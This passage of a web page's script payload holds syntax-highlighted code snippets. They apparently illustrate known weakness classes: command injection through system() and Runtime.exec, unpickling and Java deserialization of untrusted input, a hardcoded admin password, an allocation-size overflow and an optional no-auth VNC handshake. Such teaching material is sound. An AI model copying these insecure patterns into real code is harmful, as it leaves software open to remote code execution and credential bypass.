punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e self\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eselect_security_type\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        log\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eerr\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Can't handle VNC version %r\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e%\u003c/span\u003e version\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        self\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etransport\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eloseConnection\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003eselect_security_type\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eself\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e security_type\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token triple-quoted-string string\"\u003e\"\"\"\n    Choose the security type that the client wants.\n    \"\"\"\u003c/span\u003e\n    security_type \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token builtin\"\u003eord\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003esecurity_type\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e security_type \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e# VNC authentication. Issue our challenge.\u003c/span\u003e\n        self\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003echallenge \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e urandom\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e16\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        self\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etransport\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ewrite\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eself\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003echallenge\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e self\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003evnc_authentication_result\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e16\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eelif\u003c/span\u003e security_type \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e# No authentication. Just move to the SecurityResult.\u003c/span\u003e\n        self\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eauthenticated\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        log\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eerr\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Couldn't agree on an authentication scheme!\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        self\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etransport\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eloseConnection\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"34:T514,\u003cspan class=\"token class-name\"\u003eimg_t\u003c/span\u003e table_ptr\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e \u003cspan class=\"token comment\"\u003e/*struct containing img data, 10kB each*/\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e num_imgs\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\nnum_imgs \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003eget_num_imgs\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\ntable_ptr \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name\"\u003eimg_t\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token function\"\u003emalloc\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003esizeof\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name\"\u003eimg_t\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e num_imgs\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\n35:Tde7,"])</script><script>self.__next_f.push([1,"pitch \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003ePAD\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003ewidth\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e tjPixelSize\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003epixelFormat\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e align\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003edstBuf \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token function\"\u003emalloc\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epitch \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003eheight\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token constant\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"token keyword\"\u003elong\u003c/span\u003e \u003cspan class=\"token keyword\"\u003elong\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003epitch \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"token keyword\"\u003elong\u003c/span\u003e \u003cspan class=\"token keyword\"\u003elong\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003eheight\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"token keyword\"\u003elong\u003c/span\u003e \u003cspan class=\"token keyword\"\u003elong\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name\"\u003esize_t\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003edstBuf \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token function\"\u003emalloc\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epitch \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003eheight\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token constant\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"token function\"\u003e_throwg\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"tjLoadImage(): Memory allocation failure\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"36:T732,\u003cspan class=\"token keyword\"\u003etry\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token class-name\"\u003eFile\u003c/span\u003e file \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eFile\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"object.obj\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token class-name\"\u003eObjectInputStream\u003c/span\u003e in \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eObjectInputStream\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eFileInputStream\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003efile\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token class-name\"\u003e\u003cspan class=\"token namespace\"\u003ejavax\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eswing\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003c/span\u003eJButton\u003c/span\u003e button \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name\"\u003e\u003cspan class=\"token namespace\"\u003ejavax\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eswing\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003c/span\u003eJButton\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003ein\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ereadObject\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    in\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eclose\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n37:T411,\u003cspan class=\"token keyword\"\u003eprivate\u003c/span\u003e \u003cspan class=\"token keyword\"\u003efinal\u003c/span\u003e \u003cspan class=\"token keyword\"\u003evoid\u003c/span\u003e \u003cspan class=\"token function\"\u003ereadObject\u003c/span\u003e\u003cspan class=\"token p"])</script><script>self.__next_f.push([1,"unctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name\"\u003eObjectInputStream\u003c/span\u003e in\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ethrows\u003c/span\u003e \u003cspan class=\"token class-name\"\u003e\u003cspan class=\"token namespace\"\u003ejava\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eio\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003c/span\u003eIOException\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ethrow\u003c/span\u003e \u003cspan class=\"token keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"token class-name\"\u003e\u003cspan class=\"token namespace\"\u003ejava\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eio\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003c/span\u003eIOException\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Cannot be deserialized\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n38:Ta82,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eExampleProtocol\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eprotocol\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eProtocol\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003edataReceived\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eself\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e data\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e# Code that would be here would parse the incoming data\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e# After receiving headers, call confirmAuth() to authenticate\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003epass\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003econfirmAuth\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eself\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e headers\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003etry\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            token \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e cPickle\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eloads\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ebase64\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eb64decode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eheaders\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e'AuthToken'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token keyword\"\u003enot\u003c/span\u003e check_hmac\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003etoken\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e'signature'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e token\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e'data'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e getSecretKey\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n                \u003cspan class=\"token keyword\"\u003eraise\u003c/span\u003e AuthFail\n            self\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esecure_data \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e token\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e'data'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eexcept\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003eraise\u003c/span\u003e AuthFail\n"])</script><script>self.__next_f.push([1,"39:T4b7,\u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e \u003cspan class=\"token function\"\u003emain\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e argc\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003eargv\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e cmd\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003eCMD_MAX\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"/usr/bin/cat \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003estrcat\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ecmd\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e argv\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003esystem\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ecmd\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n3a:T50d,\u003cspan class=\"token class-name\"\u003eString\u003c/span\u003e btype \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e request\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003egetParameter\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"backuptype\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token class-name\"\u003eString\u003c/span\u003e cmd \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eString\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"cmd.exe /K \\\" c:\\\\util\\\\rmanDB.bat \"\u003c/span\u003e\n    \u003cspan class=\"token operator\"\u003e+\u003c/span\u003ebtype\u003cspan class=\"token operator\"\u003e+\u003c/span\u003e\n    \u003cspan class=\"token string\"\u003e\"\u0026amp;\u0026amp;c:\\\\utl\\\\cleanup.bat\\\"\"\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e)\u003c/"])</script><script>self.__next_f.push([1,"span\u003e\n\n\u003cspan class=\"token class-name\"\u003eSystem\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eRuntime\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003egetRuntime\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eexec\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ecmd\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n3b:T676,\u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e \u003cspan class=\"token function\"\u003eVerifyAdmin\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003epassword\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003estrcmp\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epassword\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"68af404b513073584c4b6f22b6c63e6b\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003eprintf\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Incorrect Password!\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003eprintf\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Entering Diagnostic Mode...\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n3c:T4d5,const crypto = require(\"crypto\");\nconst fs = require(\"fs\");\nconst path = require(\"path\");\n\nconst keyPath =\n  process.env.NODE_ENV === \"development\"\n    ? path.resolve(__dirname, `../../../server/storage/comkey`)\n    : path.resolve(process.env.STORAGE_DIR, `comkey`);\n\nclass CommunicationKey {\n  #pubKeyName = \"ipc-pub.pem\";\n  #storageLoc = keyPath;\n\n  constructor() {}\n\n  log(text, ...args) {\n    console.log(`\\x1b[36m[CommunicationKeyVerify]\\x1b[0m ${text}`, ...args);\n  }\n\n  #readPublicKey() {\n    return fs.readFileSync(path.resolve(this.#storageLoc, this.#pubKeyName));\n  }\n\n  // Given a signed payload from private key from /app/server/ this signature should\n  // decode to match the textData provided. This class does verification only in collector.\n  // Note: The textData is typically the JSON stringified body sent to the document processor API.\n  verify(signature = \"\", textData = \"\") {\n    try {\n      let data = textData;\n      if (typeof textData !== \"string\") data = JSON.stringify(data);\n      return crypto.verify(\n        \"RSA-SHA256\",\n        Buffer.from(data),\n        this.#readPublicKey(),\n        Buffer.from(signature, \"hex\")\n      );\n    } catch {}\n    return false;\n  }\n}\n\nmodule.exports = { CommunicationKey };\n3d:T1f44,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e crypto \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003erequire\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"crypto\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e fs \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003erequire\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"fs\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e path \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003erequire\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"path\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e keyPath \u003cspan 